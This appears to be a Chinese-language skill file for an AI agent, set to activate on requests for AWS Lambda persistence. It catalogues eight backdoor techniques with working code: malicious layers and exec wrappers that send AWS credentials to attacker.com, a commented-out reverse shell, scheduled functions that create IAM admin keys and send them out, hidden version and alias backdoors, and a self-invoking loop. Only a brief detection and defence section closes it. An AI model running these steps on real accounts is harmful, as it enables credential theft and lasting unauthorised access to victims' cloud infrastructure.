---
name: aws-lambda-persistence
description: AWS Lambda 持久化技术 - 层后门、扩展利用、版本后门
category: 云安全渗透测试
platform: AWS
technique_type: 持久化
triggers:
  - "Lambda 持久化"
  - "Lambda 后门"
  - "Lambda 层利用"
  - "AWS 持久化"
---

# AWS Lambda 持久化技术

## 触发条件

当用户要求以下任务时激活此技能：

- "在 AWS Lambda 中建立持久化"
- "Lambda 后门技术"
- "Lambda 层注入"
- "Lambda 版本后门"

---

## 技术清单

### 1. Lambda 层后门

**原理**: 在 Lambda 层中植入恶意代码，所有使用该层的函数都会执行

```bash
# 步骤 1: 创建恶意层
mkdir -p layer/python

cat > layer/python/__init__.py <<'EOF'
import os
import subprocess
import requests

# 层导入时自动执行
def init():
    try:
        # 反向 Shell
        # subprocess.run(['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'])

        # 或发送凭证到外带
        creds = {
            'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID'),
            'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY'),
            'SessionToken': os.environ.get('AWS_SESSION_TOKEN'),
            'FunctionName': os.environ.get('AWS_LAMBDA_FUNCTION_NAME')
        }
        requests.post('https://attacker.com/exfil', json=creds)
    except Exception as e:
        pass

init()
EOF

cd layer && zip -r /tmp/malicious-layer.zip .

# 步骤 2: 发布层
aws lambda publish-layer-version \
  --layer-name "common-libs" \
  --description "Common Python libraries" \
  --zip-file fileb:///tmp/malicious-layer.zip \
  --compatible-runtimes python3.9 python3.8

# 步骤 3: 获取层 ARN
LAYER_ARN=$(aws lambda list-layer-versions \
  --layer-name "common-libs" \
  --query 'LayerVersions[0].LayerVersionArn' \
  --output text)

# 步骤 4: 添加到目标函数
aws lambda update-function-configuration \
  --function-name target-function \
  --layers $LAYER_ARN

# 步骤 5: 每次函数执行时，恶意代码都会运行
```

**影响**: 隐蔽持久化，所有使用该层的函数都会执行恶意代码

---

### 2. Lambda 扩展后门

**原理**: 使用 Lambda 扩展在函数执行前/后运行代码

```bash
# 步骤 1: 创建扩展
mkdir -p extension

cat > extension/index.py <<'EOF'
import os
import subprocess
import sys

def handler(event, context):
    # 在 Lambda 函数执行前运行
    print("[Extension] Pre-execution backdoor running...")

    # 窃取凭证
    creds = {
        'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID'),
        'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'SessionToken': os.environ.get('AWS_SESSION_TOKEN')
    }

    # 保存到 /tmp
    with open('/tmp/creds.txt', 'w') as f:
        f.write(str(creds))

    return event

# 扩展入口点
if __name__ == '__main__':
    # 读取来自 Lambda 的请求
    import json
    event = json.loads(sys.stdin.read())
    result = handler(event, None)
    print(json.dumps(result))
EOF

cat > extension/extension.yaml <<'EOF'
Name: backdoor-extension
BasePath: /opt
EntryPoint: python3 index.py
Events:
  - Type: PreInvoke
    Order: 1
EOF

cd extension && zip -r /tmp/extension.zip .

# 步骤 2: 部署扩展（需要直接修改函数配置）
# 注意：扩展需要在函数创建时指定，或通过更新添加

# 步骤 3: 更新函数使用扩展
aws lambda update-function-configuration \
  --function-name target-function \
  --handler "index.handler"
```

**影响**: 扩展在每次函数调用时自动执行，难以检测

---

### 3. 版本后门 + API Gateway

**原理**: 创建后门版本并通过 API Gateway 单独调用

```bash
# 步骤 1: 备份原始代码
aws lambda get-function --function-name target-function
# 下载并保存原始代码

# 步骤 2: 创建后门版本
cat > backdoor.py <<'EOF'
import boto3
import os

def lambda_handler(event, context):
    # 后门代码
    client = boto3.client('iam')
    response = client.create_access_key(UserName='admin')
    return response
EOF

zip backdoor.zip backdoor.py

# 步骤 3: 发布后门版本
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://backdoor.zip

aws lambda publish-version --function-name target-function
# 假设创建版本 1（后门版本）

# 步骤 4: 恢复原始代码并发布版本 2
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://original.zip

aws lambda publish-version --function-name target-function
# 版本 2（正常版本）

# 步骤 5: 更新别名指向正常版本
aws lambda create-alias \
  --function-name target-function \
  --function-version 2 \
  --name PROD

# 步骤 6: 通过 API Gateway 配置仅能调用后门版本
# 在 API Gateway 中设置 Integration Request 为:
# arn:aws:lambda:region:account_id:function:target-function:1

# 步骤 7: 通过 API Gateway 调用后门版本
curl -X POST https://api-id.execute-api.us-east-1.amazonaws.com/prod/backdoor
```

**影响**: 正常流量使用版本 2，只有知道 API Gateway 端点的攻击者能触发版本 1

---

### 4. 异步自循环后门

**原理**: 使用异步目标和递归配置创建自触发后门

```bash
# 步骤 1: 创建恶意 Lambda
cat > self_loop.py <<'EOF'
import json

def lambda_handler(event, context):
    # 后门代码
    print("Backdoor executing...")

    # 调用自己形成循环
    import boto3
    lambda_client = boto3.client('lambda')
    lambda_client.invoke(
        FunctionName=context.function_name,
        InvocationType='Event'  # 异步调用
    )

    return {
        'statusCode': 200,
        'body': 'Looping...'
    }
EOF

zip self_loop.zip self_loop.py

# 步骤 2: 创建函数
aws lambda create-function \
  --function-name self-loop-backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaRole \
  --handler self_loop.lambda_handler \
  --zip-file fileb://self_loop.zip \
  --timeout 30

# 步骤 3: 配置递归（允许循环调用）
aws lambda put-function-concurrency \
  --function-name self-loop-backdoor \
  --reserved-concurrent-executions 1

# 步骤 4: 初始触发
aws lambda invoke \
  --function-name self-loop-backdoor \
  --invocation-type Event \
  output.txt

# 函数将无限循环执行，直到手动停止
```

**影响**: 创建持续性后门，无需外部触发器

---

### 5. Cron/Event 触发后门

**原理**: 使用 EventBridge 或定时任务触发后门

```bash
# 步骤 1: 创建后门 Lambda
cat > cron_backdoor.py <<'EOF'
import boto3
import requests

def lambda_handler(event, context):
    # 创建管理员密钥
    client = boto3.client('iam')
    key = client.create_access_key(UserName='admin')

    # 发送到外部
    requests.post('https://attacker.com/exfil', json=key)

    return {'statusCode': 200}
EOF

zip cron_backdoor.zip cron_backdoor.py

aws lambda create-function \
  --function-name cron-backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaRole \
  --handler cron_backdoor.lambda_handler \
  --zip-file fileb://cron_backdoor.zip

# 步骤 2: 创建 EventBridge 规则（每天执行）
aws events put-rule \
  --name daily-backdoor-trigger \
  --schedule-expression "rate(1 day)"

# 步骤 3: 添加目标
aws lambda add-permission \
  --function-name cron-backdoor \
  --statement-id daily-backdoor \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:123456789012:rule/daily-backdoor-trigger

aws events put-targets \
  --rule daily-backdoor-trigger \
  --targets "Id=1,Arn=arn:aws:lambda:us-east-1:123456789012:function:cron-backdoor"

# 步骤 4: 手动测试
aws events invoke-rule \
  --rule daily-backdoor-trigger
```

**影响**: 定期执行后门，维持长期访问

---

### 6. 别名和权重后门

**原理**: 使用别名和权重配置，小流量触发后门

```bash
# 步骤 1: 发布后门版本（版本 1）
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://backdoor.zip

aws lambda publish-version --function-name target-function

# 步骤 2: 发布正常版本（版本 2）
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://original.zip

aws lambda publish-version --function-name target-function

# 步骤 3: 创建别名指向版本 2（正常版本）
aws lambda create-alias \
  --function-name target-function \
  --function-version 2 \
  --name PROD

# 步骤 4: 配置路由权重
# 99% 流量到版本 2（正常），1% 到版本 1（后门）
# 这需要在 API Gateway 或 Lambda URL 中配置

# 步骤 5: 随机触发后门
# 每调用 100 次，约 1 次会触发后门版本
```

**影响**: 隐蔽后门，小概率触发难以检测

---

### 7. Execution Wrapper 后门

**原理**: 利用 AWS_LAMBDA_EXEC_WRAPPER 环境变量

```bash
# 步骤 1: 创建包装脚本
cat > wrapper.sh <<'EOF'
#!/bin/bash
# 恶意代码在 Lambda 启动前执行
curl -X POST https://attacker.com/notify \
  -d "$(env | grep AWS_)"

# 执行原始运行时
exec "$@"
EOF

# 步骤 2: 创建包含包装脚本的层
mkdir -p layer/bin
cp wrapper.sh layer/bin/
chmod +x layer/bin/wrapper.sh

cd layer && zip -r /tmp/wrapper-layer.zip .

# 步骤 3: 发布层
aws lambda publish-layer-version \
  --layer-name "wrapper" \
  --zip-file fileb:///tmp/wrapper-layer.zip

LAYER_ARN=$(aws lambda list-layer-versions \
  --layer-name "wrapper" \
  --query 'LayerVersions[0].LayerVersionArn' \
  --output text)

# 步骤 4: 配置函数使用包装器
aws lambda update-function-configuration \
  --function-name target-function \
  --layers $LAYER_ARN \
  --environment 'Variables={AWS_LAMBDA_EXEC_WRAPPER=/opt/bin/wrapper.sh}'

# 步骤 5: 每次函数启动时执行包装脚本
```

**影响**: 在函数执行前运行任意代码

---

### 8. 运行时固定后门

**原理**: 固定 Lambda 运行时版本，防止恶意层失效

```bash
# 步骤 1: 获取当前运行时版本
aws logs filter-log-events \
  --log-group-name /aws/lambda/target-function \
  --filter-pattern "INIT_START" \
  --limit 1

# 步骤 2: 固定运行时版本
aws lambda put-runtime-management-config \
  --function-name target-function \
  --update-runtime-on FunctionUpdate \
  --runtime-version-arn arn:aws:lambda:us-east-1::runtime:0123456789

# 步骤 3: 验证配置
aws lambda get-runtime-management-config \
  --function-name target-function

# 这确保即使更新函数，运行时版本也不会改变
# 保持与恶意层的兼容性
```

**影响**: 保持后门与特定运行时版本的兼容性

---

## 持久化技术对比

| 技术 | 隐蔽性 | 检测难度 | 持久性 | 复杂度 |
|------|-------|---------|--------|--------|
| 层后门 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ |
| 扩展后门 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 版本后门 | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| 自循环后门 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| Cron 后门 | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | ⭐ |
| Wrapper 后门 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |

---

## 防御措施

### 检测方法

```bash
# 监控层创建
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=PublishLayerVersion

# 监控版本发布
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=PublishVersion

# 监控函数更新
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode

# 检查异常环境变量
aws lambda get-function-configuration --function-name target-function
```

### 防御建议

1. **代码审查**: 定期审查 Lambda 代码和层
2. **最小权限**: 限制 Lambda 角色权限
3. **网络隔离**: 在 VPC 中运行 Lambda 并限制出站
4. **监控告警**: 配置 CloudWatch 告警
5. **层白名单**: 只允许使用经过审查的层

---

## 参考资源

- HackTricks Lambda Persistence: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-pentesting/aws-persistence/aws-lambda-persistence
- AWS Lambda Extensions: https://docs.aws.amazon.com/lambda/latest/dg/extensions.html
- Rhino Security Labs - Lambda Persistence: https://rhinosecuritylabs.com/
